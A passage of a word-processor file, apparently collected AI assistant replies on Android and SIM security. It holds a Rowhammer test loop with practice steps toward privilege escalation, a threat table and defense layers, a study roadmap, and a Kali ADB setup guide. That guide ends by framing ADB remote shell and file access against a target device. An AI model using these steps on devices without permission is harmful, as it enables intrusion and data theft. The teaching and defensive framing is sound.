      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Implement eFuse protection</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Enable JTAG password protection if available</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use tamper-evident packaging</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">24. Rowhammer Attacks on Mobile DRAM</text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: Mobile DRAM</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: Rowhammer attacks exploit physical characteristics of DRAM to flip bits in adjacent memory rows through repeated access. This can lead to privilege escalation, bypassing security boundaries, and code execution. Mobile devices are particularly vulnerable due to high-density DRAM. While more difficult to execute remotely, malicious apps can trigger Rowhammer effects.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Use Rowhammer testing tools on vulnerable device</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Monitor for bit flips</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Attempt privilege escalation</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Document vulnerable memory regions</text:p>
      <text:p text:style-name="P27">// Rowhammer test pattern</text:p>
      <text:p text:style-name="P27">volatile uint64_t *ptr = (uint64_t*)malloc(0x100000);</text:p>
      <text:p text:style-name="P27">for (int i = 0; i &lt; 1000000; i++) {</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>*ptr = i;</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>_mm_clflush(ptr);</text:p>
      <text:p text:style-name="P27">}</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Apply firmware updates with Rowhammer mitigations</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use error-correcting code (ECC) memory where available</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Enable target row refresh (TRR) features</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Limit direct memory access from untrusted apps</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use hardware security modules for sensitive operations</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P37">Summary Table: Top Threats by Category</text:p>
      <text:p text:style-name="Preformatted_20_Text">Category<text:tab/>Vulnerability<text:tab/>Attack Vector<text:tab/>Defense Priority</text:p>
      <text:p text:style-name="Preformatted_20_Text">SIM<text:tab/>COMP128 Cracking<text:tab/>Radio proximity<text:tab/>High - Replace old SIMs</text:p>
      <text:p text:style-name="Preformatted_20_Text">SIM<text:tab/>SIM Swap<text:tab/>Social engineering<text:tab/>Critical - Carrier PIN</text:p>
      <text:p text:style-name="Preformatted_20_Text">Baseband<text:tab/>Qualcomm QMI<text:tab/>Malicious app<text:tab/>High - Security patches</text:p>
      <text:p text:style-name="Preformatted_20_Text">Baseband<text:tab/>Shadow SIM<text:tab/>Firmware mod<text:tab/>Medium - Secure boot</text:p>
      <text:p text:style-name="Preformatted_20_Text">OS<text:tab/>Accessibility Abuse<text:tab/>Social engineering<text:tab/>High - Permission audit</text:p>
      <text:p text:style-name="Preformatted_20_Text">OS<text:tab/>StrandHogg<text:tab/>Malicious app<text:tab/>Medium - Updates</text:p>
      <text:p text:style-name="Preformatted_20_Text">OS<text:tab/>ADB Exploitation<text:tab/>Physical/USB<text:tab/>Critical - Disable debug</text:p>
      <text:p text:style-name="Preformatted_20_Text">App<text:tab/>WebView Bridges<text:tab/>Web content<text:tab/>High - Validate interfaces</text:p>
      <text:p text:style-name="Preformatted_20_Text">App<text:tab/>Insecure Storage<text:tab/>Physical access<text:tab/>Critical - Encrypt data</text:p>
      <text:p text:style-name="Preformatted_20_Text">Network<text:tab/>SS7 Attacks<text:tab/>Carrier network<text:tab/>Critical - App 2FA</text:p>
      <text:p text:style-name="Preformatted_20_Text">Network<text:tab/>IMSI Catchers<text:tab/>Radio proximity<text:tab/>High - Disable 2G</text:p>
      <text:p text:style-name="Preformatted_20_Text">Hardware<text:tab/>JTAG Access<text:tab/>Physical<text:tab/>Medium - Secure hardware</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Conclusion:</text:span> <text:span text:style-name="T4">Building a Comprehensive Defense Strategy</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text">As a security professional, you should approach Android and SIM security through layered defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text">Layer 1 - Device Configuration:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Disable unnecessary features (2G, ADB, Wi-Fi calling)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Enable SIM PIN (consider Android 17 automation trade-offs)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use strong lock screen with biometrics</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Keep OS and apps updated</text:p>
      <text:p text:style-name="Preformatted_20_Text">Layer 2 - App Security:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Install only from trusted sources</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Review app permissions regularly</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use security solutions (ESET, Malwarebytes)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Avoid rooting/jailbreaking</text:p>
      <text:p text:style-name="Preformatted_20_Text">Layer 3 - Authentication:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Replace SMS 2FA with authenticator apps</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use hardware security keys for critical accounts</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Enable carrier account protection</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Monitor for suspicious account activity</text:p>
      <text:p text:style-name="Preformatted_20_Text">Layer 4 - Network Security:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use VPN on untrusted networks</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Disable 2G/3G where possible</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Be aware of IMSI catcher risks</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use encrypted messaging apps</text:p>
      <text:p text:style-name="Preformatted_20_Text">Layer 5 - Physical Security:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Keep devices physically secure</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use remote wipe capabilities</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Enable full disk encryption</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Consider tamper-evident features</text:p>
      <text:p text:style-name="Preformatted_20_Text">The mobile threat landscape continues to evolve rapidly. Stay informed through security bulletins from Google, carrier alerts, and security research communities. Regular security assessments of your own devices and practices will help identify vulnerabilities before attackers can exploit them.</text:p>
      <text:p text:style-name="Preformatted_20_Text">­</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P43">Android and SIM card vulnerabilities</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Based on your interest in Android and SIM card vulnerabilities, I can outline a structured learning path to build deep, practical competence. The key is to combine foundational knowledge with specialized, hands-on training that reflects real-world threats. The following recommendations are synthesized from industry-recognized training programs and the latest research in mobile security.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Here is a progressive study roadmap designed to transform your understanding from general concepts to expert-level analysis.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">Level 1: Build a Strong Foundation</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Before diving into exploits, you need a solid grasp of core IT and security principles. This foundation will make advanced topics far more comprehensible.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• What to Study: Core networking concepts (TCP/IP, DNS, HTTP/HTTPS), operating system fundamentals (Linux/Windows), and basic security principles (CIA triad, common vulnerabilities, access control). The CompTIA Security+ certification is an excellent, vendor-neutral starting point that covers these topics, including an introduction to mobile security concerns .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Why It Matters: Every mobile vulnerability you will study—from a flawed network protocol to an insecure app data storage issue—is an application of these fundamental concepts.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="4"/>• Next Step: Focus on understanding how things work, not just what the vulnerabilities are. Set up a home lab with virtual machines to practice.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Level 2: Specialize in Mobile Platforms</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">With a foundation in place, you can focus specifically on the architecture and security models of Android and iOS. This is where you start to understand the "why" behind the vulnerabilities.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• What to Study: The Android security model (permissions, sandboxing, app signing, keystore), the Linux kernel's role, Inter-Process Communication (IPC), and the specifics of each Android version's security enhancements. For a structured approach, consider courses like Kennesaw State University's "Cybersecurity and Mobility" on Coursera, which covers enterprise mobility, IoT, and mobile threats .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Why It Matters: Vulnerabilities like "StrandHogg" (task hijacking) or "Janus" (signature bypass) [from our previous conversation] are direct consequences of specific design choices in Android's IPC and APK handling. You cannot exploit or defend against them without understanding those systems.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">Level 3: Hands-On Analysis and Exploitation</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">This is where you move from theory to practice by learning how security professionals actively test applications and devices.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• What to Study: Practical mobile application penetration testing. This involves setting up testing environments, using tools like Burp Suite, Frida, and MobSF, and learning techniques for static and dynamic analysis, reverse-engineering, and intercepting network traffic. The INE Security Mobile Application Penetration Tester (eMAPT) certification is designed specifically for this, focusing on analyzing and pentesting Android apps in a practical, exam-based setting .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Why It Matters: This directly translates to your goal. By learning to pentest an app, you will discover vulnerabilities like insecure data storage, broken cryptography, or side-channel leaks firsthand. The eMAPT curriculum, for example, covers advanced techniques like mobile application fuzzing and reverse engineering, which are essential for finding unknown flaws .</text:p>
      <text:p text:style-name="Preformatted_20_Text">Level 4: Advanced and Emerging Threats</text:p>
      <text:p text:style-name="Preformatted_20_Text">For a truly deep understanding, you should engage with cutting-edge research and the most complex areas of mobile security, such as the baseband and SIM card.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• What to Study: Advanced topics like baseband processor security, SIM card applet vulnerabilities, and cellular network protocol attacks. This involves engaging with academic research and highly specialized training.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>◦ SIM Card Security: Review research papers like "SIMurai: Slicing Through the Complexity of SIM Card Security Research" from CISPA, which demonstrates how malicious SIM cards can attack devices and led to the discovery of high-severity vulnerabilities in flagship smartphones .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>◦ Platform-Level Security: Understand the highest levels of platform assurance, such as Android's recent achievement of the SESIP Level 5 certification for its pKVM hypervisor, which ensures it can resist attacks from well-funded and highly skilled adversaries .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>◦ Specialized Training: For a comprehensive deep dive, consider advanced courses like the SANS Institute's "SEC575: iOS and Android Application Security Analysis and Penetration Testing" (which prepares for the GIAC GMOB certification) or Mandiant Academy's "Practical Mobile Application Security" course, which covers advanced topics like Arm64 assembly and thick client app testing .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Why It Matters: This level of study prepares you to understand and potentially discover the kinds of sophisticated vulnerabilities we discussed earlier, such as Qualcomm baseband QMI exploits or SIM card Java applet flaws. It moves you from a "user" of security knowledge to a contributor.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Summary of Key Certifications and Courses</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>Certification/Course<text:tab/>Focus Area<text:tab/>Provider<text:tab/>Key Benefit</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">CompTIA Security+<text:tab/>Foundational IT Security<text:tab/>CompTIA<text:tab/>Entry-level, broad coverage including mobile basics.</text:p>
      <text:p text:style-name="Preformatted_20_Text">eMAPT<text:tab/>Mobile App Penetration Testing<text:tab/>INE Security<text:tab/>Hands-on, practical exam for Android app pentesting.</text:p>
      <text:p text:style-name="Preformatted_20_Text">GIAC GMOB (GMOB)<text:tab/>Advanced Mobile Device Security<text:tab/>GIAC (SANS)<text:tab/>Comprehensive coverage of iOS/Android hardware, software, and app security analysis.</text:p>
      <text:p text:style-name="Preformatted_20_Text">SEC575<text:tab/>iOS/Android App Security Analysis<text:tab/>SANS Institute<text:tab/>In-depth training course corresponding to GMOB certification.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Practical Mobile Application Security<text:tab/>Advanced Mobile App Testing<text:tab/>Mandiant Academy<text:tab/>Instructor-led, covers threat modeling, Linux CLI, and object-oriented programming.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">By following this progressive path, you will build a robust and practical understanding of mobile security, from the foundational principles to the most advanced and emerging threats, making you highly competent in the field.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P44"/>
      <text:p text:style-name="Text_20_body">You're right! That error means the <text:span text:style-name="T12">ADB (Android Debug Bridge) tools aren't installed</text:span> on your Kali Linux system yet.</text:p>
      <text:p text:style-name="Text_20_body">Let me guide you through the complete setup:</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">📦 Step 1: Install ADB on Kali Linux</text:h>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Method 1: Install via APT (Recommended)</text:h>
      <text:p text:style-name="P44"># Update your package list<text:line-break/>sudo apt update<text:line-break/><text:line-break/># Install ADB and Fastboot<text:line-break/>sudo apt install -y adb fastboot<text:line-break/><text:line-break/># Verify installation<text:line-break/>adb --version</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Method 2: Install via Platform Tools (For Latest Version)</text:h>
      <text:p text:style-name="Text_20_body">If you need the absolute latest version:</text:p>
      <text:p text:style-name="P44"># Download the latest platform tools<text:line-break/>wget https://dl.google.com/android/repository/platform-tools-latest-linux.zip<text:line-break/><text:line-break/># Extract the archive<text:line-break/>unzip platform-tools-latest-linux.zip -d ~/<text:line-break/><text:line-break/># Add to PATH (temporary)<text:line-break/>export PATH=$PATH:~/platform-tools<text:line-break/><text:line-break/><text:soft-page-break/># Make permanent (add to .bashrc)<text:line-break/>echo 'export PATH=$PATH:~/platform-tools' &gt;&gt; ~/.bashrc</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">📱 Step 2: Enable ADB on Your Android Device</text:h>
      <text:p text:style-name="Text_20_body">On your Android phone, you need to enable Developer Options and USB Debugging:</text:p>
      <text:list text:style-name="L3">
        <text:list-item>
          <text:p text:style-name="P45"><text:span text:style-name="T12">Go to Settings</text:span> → <text:span text:style-name="T12">About Phone</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P45"><text:span text:style-name="T12">Tap "Build Number" 7 times</text:span> until you see "You are now a developer!"</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P45"><text:span text:style-name="T12">Go back to Settings</text:span> → <text:span text:style-name="T12">System</text:span> → <text:span text:style-name="T12">Developer Options</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P45"><text:span text:style-name="T12">Toggle on "USB Debugging"</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P45"><text:span text:style-name="T12">Toggle on "Wireless Debugging"</text:span> (for network connections)</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">🔗 Step 3: Connect Your Android Device</text:h>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">A. USB Connection (Simple &amp; Reliable)</text:h>
      <text:p text:style-name="P44"># Connect your phone via USB cable<text:line-break/># Check if device is detected<text:line-break/>adb devices<text:line-break/><text:line-break/># You should see:<text:line-break/># List of devices attached<text:line-break/># 1234567890ABCDEF <text:s text:c="3"/>device</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">B. Wireless Connection (Modern Android 11+)</text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">Step 1: Pair the Device</text:span></text:p>
      <text:p text:style-name="P44"># On your Android phone, go to:<text:line-break/># Settings → Developer Options → Wireless Debugging<text:line-break/># Tap "Pair device with pairing code"<text:line-break/><text:line-break/># You'll see:<text:line-break/># IP address &amp; port: 192.168.1.100:37265<text:line-break/># Pairing code: 123456<text:line-break/><text:line-break/># On Kali, run:<text:line-break/>adb pair 192.168.1.100:37265<text:line-break/># Enter the pairing code when prompted</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">Step 2: Connect to the Device</text:span></text:p>
      <text:p text:style-name="P44"># After pairing, you'll get a connection address<text:line-break/># Example: 192.168.1.100:43210<text:line-break/><text:line-break/># Connect using:<text:line-break/>adb connect 192.168.1.100:43210<text:line-break/><text:soft-page-break/><text:line-break/># Verify:<text:line-break/>adb devices<text:line-break/># You should see:<text:line-break/># 192.168.1.100:43210 <text:s text:c="3"/>device</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">C. Wireless Connection (Older Android Method)</text:h>
      <text:p text:style-name="P44"># First, connect via USB<text:line-break/>adb devices<text:line-break/><text:line-break/># Enable wireless ADB on the phone<text:line-break/>adb tcpip 5555<text:line-break/><text:line-break/># Disconnect USB and find your phone's IP<text:line-break/># On phone: Settings → About Phone → Status → IP Address<text:line-break/><text:line-break/># Connect over WiFi<text:line-break/>adb connect 192.168.1.100:5555<text:line-break/><text:line-break/># Verify connection<text:line-break/>adb devices</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">🧪 Step 4: Test Your Connection</text:h>
      <text:p text:style-name="Text_20_body">Once connected, you can run these test commands:</text:p>
      <text:p text:style-name="P44"># Open an interactive shell<text:line-break/>adb shell<text:line-break/><text:line-break/># Inside the shell, you can run Android commands:<text:line-break/>ls /data/data/<text:line-break/>pm list packages<text:line-break/>getprop ro.build.version.release<text:line-break/><text:line-break/># Exit the shell<text:line-break/>exit<text:line-break/><text:line-break/># Or run single commands directly:<text:line-break/>adb shell getprop ro.build.version.release<text:line-break/>adb shell pm list packages | grep google<text:line-break/>adb shell dumpsys battery</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">🛡️ Step 5: Security Testing Commands (ETHICAL USE ONLY)</text:h>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Information Gathering</text:h>
      <text:p text:style-name="P44"># Get device information<text:line-break/>adb shell getprop ro.product.model<text:line-break/>adb shell getprop ro.build.version.sdk<text:line-break/><text:line-break/># List all installed packages<text:line-break/><text:soft-page-break/>adb shell pm list packages<text:line-break/><text:line-break/># List all running services<text:line-break/>adb shell dumpsys activity services<text:line-break/><text:line-break/># Check battery status<text:line-break/>adb shell dumpsys battery<text:line-break/><text:line-break/># Get device location (requires permission)<text:line-break/>adb shell dumpsys location</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">File System Access</text:h>
      <text:p text:style-name="P44"># Pull files from device<text:line-break/>adb pull /sdcard/Download/file.txt ~/Desktop/<text:line-break/><text:line-break/># Push files to device<text:line-break/>adb push ~/Desktop/test.txt /sdcard/Download/<text:line-break/><text:line-break/># Browse the file system<text:line-break/>adb shell ls -la /data/data/</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Application Management</text:h>
      <text:p text:style-name="P44"># Install an APK<text:line-break/>adb install app.apk<text:line-break/><text:line-break/># Uninstall an app (use package name)<text:line-break/>adb uninstall com.example.app<text:line-break/><text:line-break/># Force stop an app<text:line-break/>adb shell am force-stop com.example.app<text:line-break/><text:line-break/># Clear app data<text:line-break/>adb shell pm clear com.example.app</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">🚨 Common Issues &amp; Troubleshooting</text:h>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Issue 1: "device unauthorized"</text:h>
      <text:p text:style-name="P44"># On your Android phone, you'll see a popup asking to<text:line-break/># "Allow USB debugging?" <text:line-break/># Tap "OK" or "Always allow from this computer"<text:line-break/># Then try again:<text:line-break/>adb devices</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Issue 2: "device offline"</text:h>
      <text:p text:style-name="P44"># Restart the ADB server<text:line-break/>adb kill-server<text:line-break/>adb start-server<text:line-break/><text:line-break/># Reconnect<text:line-break/><text:soft-page-break/>adb connect 192.168.1.100:5555</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Issue 3: "command not found" for adb</text:h>
      <text:p text:style-name="P44"># Check if installed<text:line-break/>which adb<text:line-break/><text:line-break/># If still not found, install:<text:line-break/>sudo apt install --reinstall adb<text:line-break/><text:line-break/># Or use full path:<text:line-break/>~/platform-tools/adb devices</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">🧠 Understanding the ADB Architecture</text:h>
      <text:p text:style-name="P44">┌─────────────────────────────────────────────────────────────┐<text:line-break/>│ <text:s text:c="20"/>YOUR KALI MACHINE <text:s text:c="22"/>│<text:line-break/>│ <text:s/>┌─────────────────────────────────────────────────────────┐│<text:line-break/>│ <text:s/>│ <text:s text:c="20"/>ADB Client <text:s text:c="24"/>││<text:line-break/>│ <text:s/>│ <text:s/>(The commands you type in the terminal) <text:s text:c="13"/>││<text:line-break/>│ <text:s/>└────────────────────────┬────────────────────────────────┘│<text:line-break/>│ <text:s text:c="26"/>│ <text:s text:c="32"/>│<text:line-break/>│ <text:s/>┌────────────────────────▼────────────────────────────────┐│<text:line-break/>│ <text:s/>│ <text:s text:c="20"/>ADB Server <text:s text:c="24"/>││<text:line-break/>│ <text:s/>│ <text:s/>(Background process that manages connections) <text:s text:c="8"/>││<text:line-break/>│ <text:s/>└────────────────────────┬────────────────────────────────┘│<text:line-break/>│ <text:s text:c="26"/>│ <text:s text:c="32"/>│<text:line-break/>│ <text:s text:c="26"/>│ USB / WiFi <text:s text:c="21"/>│<text:line-break/>└───────────────────────────┼─────────────────────────────────┘<text:line-break/> <text:s text:c="27"/>│<text:line-break/>┌───────────────────────────▼─────────────────────────────────┐<text:line-break/>│ <text:s text:c="20"/>YOUR ANDROID PHONE <text:s text:c="22"/>│<text:line-break/>│ <text:s/>┌─────────────────────────────────────────────────────────┐│<text:line-break/>│ <text:s/>│ <text:s text:c="19"/>ADB Daemon (adbd) <text:s text:c="18"/>││<text:line-break/>│ <text:s/>│ <text:s/>(Service running on Android that receives commands) <text:s text:c="2"/>││<text:line-break/>│ <text:s/>└─────────────────────────────────────────────────────────┘│<text:line-break/>└─────────────────────────────────────────────────────────────┘</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">🎯 Practice Lab: Safe Commands to Try</text:h>
      <text:p text:style-name="Text_20_body">Here are some safe commands to practice with:</text:p>
      <text:p text:style-name="P44"># 1. Check device info<text:line-break/>adb shell getprop ro.product.model<text:line-break/>adb shell getprop ro.build.version.release<text:line-break/><text:line-break/># 2. See all running processes<text:line-break/>adb shell ps<text:line-break/><text:line-break/># 3. Check disk space<text:line-break/>adb shell df -h<text:line-break/><text:line-break/><text:soft-page-break/># 4. Take a screenshot (saves to phone)<text:line-break/>adb shell screencap /sdcard/screenshot.png<text:line-break/><text:line-break/># 5. Pull the screenshot to Kali<text:line-break/>adb pull /sdcard/screenshot.png ~/Desktop/<text:line-break/><text:line-break/># 6. List installed system apps<text:line-break/>adb shell pm list packages -s<text:line-break/><text:line-break/># 7. List installed third-party apps<text:line-break/>adb shell pm list packages -3<text:line-break/><text:line-break/># 8. Check network info<text:line-break/>adb shell ifconfig<text:line-break/>adb shell netstat -tulpn</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">📚 Resources &amp; Further Reading</text:h>
      <text:list text:style-name="L4">
        <text:list-item>
          <text:p text:style-name="P46"><text:a xlink:type="simple" xlink:href="https://developer.android.com/studio/command-line/adb" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">Android ADB Documentation</text:a></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P46"><text:a xlink:type="simple" xlink:href="https://www.andreafortuna.org/2017/07/12/adb-and-android-forensics/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">ADB Exploitation Guide</text:a></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P46"><text:a xlink:type="simple" xlink:href="https://source.android.com/security/bulletin" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">Android Security Bulletins</text:a></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">⚠️ Important Security Note</text:h>
      <text:p text:style-name="Text_20_body">These commands are powerful and can seriously harm your device if misused. Always:</text:p>
      <text:list text:style-name="L5">
        <text:list-item>
          <text:p text:style-name="P47">✅ Test on devices you own</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P47">✅ Get written permission before testing others' devices</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P47">✅ Keep USB debugging off when not needed</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P47">✅ Don't connect to untrusted WiFi with wireless debugging enabled</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:p text:style-name="Text_20_body">Now your ADB is ready! Try the basic commands above to get comfortable with the environment. Let me know if you encounter any other errors!</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body">The short answer is: <text:span text:style-name="T12">you run the commands from your Kali Linux terminal</text:span>, and they control the Android phone over the ADB connection .</text:p>
      <text:p text:style-name="Text_20_body">ADB (Android Debug Bridge) is a client-server tool that lets your computer communicate with and control an Android device. It’s a common route for exploitation once an attacker gains initial network-level access, as the commands originate from the attacker's machine .</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:soft-page-break/>🔍 How It Works: The Command Execution Flow</text:h>
      <text:p text:style-name="Text_20_body">Here's the standard process for executing ADB commands from Kali Linux to target an Android device :</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">1. Establish a Connection</text:span>: Use ADB to connect to the Android device over the network (wireless debugging) or via USB.</text:p>
      <text:p text:style-name="P44">adb devices<text:line-break/># Lists all connected devices<text:line-break/>adb connect &lt;DEVICE_IP&gt;:5555<text:line-break/># Connects to a specific device over the network</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">2. Execute Remote Commands</text:span>: Once connected, you can run commands on the device from Kali. There are two primary ways:</text:p>
      <text:list text:style-name="L6">
        <text:list-item>
          <text:p text:style-name="P48"><text:span text:style-name="T12">Interactive Shell</text:span>: Opens a persistent Linux shell on the Android device. This is the most powerful way to explore the file system, run scripts, and manipulate the system .</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P44">adb shell<text:line-break/># Opens an interactive shell on the device</text:p>
      <text:list text:style-name="L7">
        <text:list-item>
          <text:p text:style-name="P49"><text:span text:style-name="T12">Direct Command Execution</text:span>: Run a single command on the device without entering an interactive shell .</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P44">adb shell ls /data/data/<text:line-break/># Lists installed applications' data directories<text:line-break/>adb shell pm list packages<text:line-break/># Lists all installed packages on the device </text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">💥 The Threat: Weaponizing ADB in Exploits</text:h>
      <text:p text:style-name="Text_20_body">Once access is gained, attackers can use ADB to perform a wide range of malicious actions, from information theft to full system compromise.</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">Data Extraction</text:span>:</text:p>
      <text:list text:style-name="L8">
        <text:list-item>
